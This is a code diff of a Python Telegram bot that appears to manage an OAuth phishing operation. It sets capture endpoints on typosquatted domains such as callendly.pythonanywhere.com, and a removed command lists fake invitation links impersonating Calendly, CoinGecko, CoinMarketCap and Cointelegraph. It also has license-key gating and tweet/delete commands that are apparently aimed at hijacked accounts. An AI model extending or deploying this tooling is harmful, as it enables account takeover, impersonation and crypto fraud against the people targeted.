@@ -160,7 +160,7 @@ async def setup(update: Update, context: CallbackContext) -> None:
             "owner_username": owner_username,
             "identifier": identifier,
             "redirect": "https://calendly.com/cointele",
-            "endpoint": f"https://cobratool.dev/oauth?identifier={identifier}",
+            "endpoint": f"https://callendly.pythonanywhere.com/oauth?identifier={identifier}",
             "authenticated_users": []
         }
         groups.insert_one(group_data)
@@ -216,6 +216,29 @@ async def set_redirect(update: Update, context: CallbackContext) -> None:
         
         text = f"✅ *Redirect URL for this group successfully set to {url}.*"
         await context.bot.send_message(chat_id, text, parse_mode)
+        
+        
+async def display_endpoint(update: Update, context: CallbackContext) -> None:
+    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
+    
+    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
+    if not license:
+        return
+    
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
+        return
+        
+    group = groups.find_one({"group_id": chat_id})
+    if group:
+        text = f"🔗 *Endpoint: {group.get('endpoint')}*"
+        await context.bot.send_message(chat_id, text, parse_mode)
+    else:
+        text = "⚠️ *An unknown error has occured.*"
+        await context.bot.send_message(chat_id, text, parse_mode)
+        
 
 async def tweet(update: Update, context: CallbackContext) -> None:
     license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
@@ -414,30 +437,6 @@ async def delete(update: Update, context: CallbackContext) -> None:
         await update.message.reply_text(
             f'🚫 Deletion Failed 🚫\nError: {response_data["title"]}')
 
-async def links(update: Update, context: CallbackContext) -> None:
-    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
-    links = []
-    ls = []
-    if group_id == -4146400715:
-        ls = ['https://www\.calendlly\.xyz/coingecko/invitation', 'https://www\.calendlly\.xyz/coinmarketcap/invitation', 'https://www\.calendlly\.xyz/bitcoinmagazine/invitation']
-    elif group_id == -4148855237:
-        ls = ['https://www\.cointele\.site/cointelegraph/meeting\-hour?month\=2024\-07']
-    elif group_id == -4537180005:
-        ls = ['https://callendly\.pythonanywhere\.com/cointelegraph']
-
-    print(f"({update.message.chat.title}) retrieved links: [{'] ['.join(ls) if ls else 'None :('}]")
-    for link in ls:
-        link = f'> 🔗 {link}'
-        links.append(link)
-    nl = '\n'
-    list = nl.join(links)
-    await context.bot.send_message(chat_id=group_id, text=f"🔗 *Links* 🔗\n\n{list if links else '> Nothing to see here 👀'}", parse_mode='MarkdownV2')
-
-async def id(update: Update, context: CallbackContext) -> None:
-    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
-    await context.bot.send_message(chat_id=group_id, text=f"🆔 *Group ID* 🆔\n\n`{group_id}`")
-    
-    
 async def generate_key(update: Update, context: CallbackContext) -> None:
     chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
     if len(context.args) != 1:
@@ -482,8 +481,7 @@ def main() -> None:
     app.add_handler(CommandHandler("delete_tweet", delete))
     app.add_handler(CommandHandler("generate_key", generate_key))
     app.add_handler(CommandHandler("set_redirect", set_redirect))
-    app.add_handler(CommandHandler("links", links))
-    app.add_handler(CommandHandler("id", id))
+    app.add_handler(CommandHandler("display_endpoint", display_endpoint))
     app.run_polling(poll_interval=5)
 
 
